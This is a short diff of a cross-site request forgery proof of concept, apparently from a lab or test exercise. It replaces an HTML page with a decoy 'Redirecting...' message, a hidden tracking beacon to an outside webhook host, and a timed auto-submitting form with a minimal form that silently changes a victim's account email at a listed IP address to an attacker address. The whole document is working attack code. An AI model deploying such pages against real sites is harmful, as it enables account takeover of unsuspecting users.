@@ -1,30 +1,6 @@
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Account Settings CSRF</title>
-</head>
-<body>
-    <p>Redirecting...</p>
-
-    <img
-        src="https://006d396333124240a5a24829f6449a40.webhooks.page/?stage=github-page-loaded"
-        width="1"
-        height="1"
-        alt="">
-
-    <form id="exploitForm"
-          action="http://100.101.228.35:6009/settings/email"
-          method="GET">
-        <input type="hidden" name="new" value="hacker@tpas.local">
-    </form>
-
-    <script>
-        setTimeout(function () {
-            document.getElementById("exploitForm").submit();
-        }, 3000);
-    </script>
-</body>
-</html>
-```
+<form id="csrfForm" action="http://100.101.228.35:6009/settings/email" method="GET">
+  <input type="hidden" name="new" value="attacker@example.com" />
+</form>
+<script>
+  document.getElementById('csrfForm').submit();
+</script>
